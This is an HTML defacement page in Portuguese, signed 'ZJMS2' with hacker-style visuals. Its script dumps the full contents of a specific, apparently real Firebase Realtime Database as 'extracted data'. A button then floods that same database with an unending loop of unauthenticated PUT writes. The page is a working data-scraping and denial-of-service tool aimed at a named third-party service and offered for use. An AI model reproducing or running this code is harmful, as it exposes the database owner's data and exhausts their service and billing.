<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA INVADIDO</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            height:100vh; display:flex; justify-content:center; align-items:center; 
            background:#000; overflow:hidden; font-family:Consolas, monospace; cursor: crosshair;
        }
        body::before {
            content:""; position:fixed; inset:0;
            background: repeating-linear-gradient(0deg, rgba(0,255,0,.08) 0px, rgba(0,255,0,.08) 2px, transparent 2px, transparent 4px);
            animation:scan 8s linear infinite; opacity:.5; pointer-events:none;
        }
        h1 {
            color:#00ff00; font-size:70px; text-align:center;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #00ff00;
            z-index:1; animation:glitch .15s infinite alternate; pointer-events: none;
        }
        @keyframes scan { from{transform:translateY(-100%);} to{transform:translateY(100%);} }
        @keyframes glitch { from{transform:translateX(-2px);} to{transform:translateX(2px);} }
        
        #overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            display: flex; justify-content: center; align-items: center;
            color: #ff0000; font-size: 25px; cursor: pointer; z-index: 10;
        }
        #alvos-container { position: fixed; inset: 0; pointer-events: none; z-index: 2; }
        .alvo {
            position: absolute; color: #ff0000; font-size: 30px; font-weight: bold;
            cursor: crosshair; pointer-events: auto; text-shadow: 0 0 10px #ff0000;
            transition: 0.2s; user-select: none;
        }
        .alvo:hover { color: #fff; transform: scale(1.3); }

        #data-display {
            position: fixed; top: 80px; left: 20px; color: #00ff00;
            font-family: monospace; font-size: 12px; text-align: left;
            max-width: 350px; max-height: 75vh; overflow-y: auto;
            background: rgba(0, 20, 0, 0.9); padding: 15px;
            border: 1px solid #00ff00; display: none; z-index: 5;
        }
        #btn-sobrecarga {
            background:#ff0000; color:white; padding:10px; border:none; 
            cursor:pointer; width:100%; margin-top:10px; font-weight:bold;
        }
    </style>
</head>

<body>
    <div id="overlay" onclick="iniciarSistema()">
        <div>CLIQUE PARA INVADIR</div>
    </div>

    <div id="data-display">
        <div id="conteudo-dados">Carregando dados...</div>
        <button id="btn-sobrecarga" onclick="sobrecarregarFirebase()">SOBRECARREGAR FIREBASE</button>
    </div>
    
    <div id="alvos-container"></div>
    <h1>SISTEMA INVADIDO BY ZJMS2</h1>

    <audio id="terrorAudio" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        function criarAlvos() {
            const container = document.getElementById('alvos-container');
            const nomes = ["ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2", "ZJMS2"];
            for(let i = 0; i < 15; i++) {
                const span = document.createElement('span');
                span.className = 'alvo';
                span.innerText = nomes[Math.floor(Math.random() * nomes.length)];
                span.style.top = (Math.random() * 80 + 10) + 'vh';
                span.style.left = (Math.random() * 80 + 10) + 'vw';
                span.onclick = function() {
                    this.style.opacity = '0';
                    this.style.transform = 'scale(3)';
                    setTimeout(() => this.remove(), 200);
                };
                container.appendChild(span);
            }
        }

        async function iniciarSistema() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('terrorAudio').play();
            criarAlvos();

            const display = document.getElementById('data-display');
            const conteudo = document.getElementById('conteudo-dados');
            display.style.display = 'block';
            
            try {
                const resposta = await fetch('https://snoopy-obb-813a3-default-rtdb.firebaseio.com/.json');
                const dados = await resposta.json();
                conteudo.innerText = "DADOS EXTRAÍDOS:\n\n" + JSON.stringify(dados, null, 2);
            } catch (e) {
                conteudo.innerText = "ERRO: " + e.message;
            }
        }

        async function sobrecarregarFirebase() {
            if (!confirm("Deseja iniciar a sobrecarga intensiva?")) return;
            const display = document.getElementById('conteudo-dados');
            display.innerText = "SOBRECARREGANDO...";
            
            while (true) {
                fetch('https://snoopy-obb-813a3-default-rtdb.firebaseio.com/flood/' + Date.now() + '.json', {
                    method: 'PUT',
                    body: JSON.stringify({ d: "FLOOD".repeat(500) })
                });
            }
        }
    </script>
</body>
</html>
